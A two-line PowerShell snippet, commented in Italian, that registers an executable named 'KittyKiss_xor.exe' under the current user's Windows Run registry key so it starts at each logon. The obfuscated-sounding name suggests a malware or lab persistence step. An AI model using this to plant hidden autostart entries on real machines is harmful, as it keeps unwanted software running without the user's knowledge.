$path = "C:\Users\user\Desktop\KittyKiss\KittyKiss_xor.exe" # Percorso completo del file eseguibile
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KittyKiss" -Value $path -PropertyType "String" -Force
